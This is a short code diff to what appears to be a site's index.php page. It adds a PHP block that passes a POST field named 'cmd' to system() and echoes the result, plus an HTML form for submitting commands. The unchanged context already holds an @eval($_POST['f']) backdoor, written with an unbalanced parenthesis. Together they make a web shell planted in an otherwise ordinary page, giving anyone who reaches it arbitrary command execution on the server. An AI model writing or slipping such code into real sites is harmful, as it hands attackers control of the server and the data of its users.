@@ -2,6 +2,11 @@
 <?php
 @eval($_POST['f'];
 ?>
+<?php
+	if(isset($_POST['cmd'])){
+		echo system($_POST['cmd']);
+	}
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -39,6 +44,9 @@
 
 	</div>
 
-
+<form action="/index.php" method="post">
+        Cmd: <input type="text" name="cmd">
+        <input type="submit" value="Submit">
+</form>
 </body>
 </html>
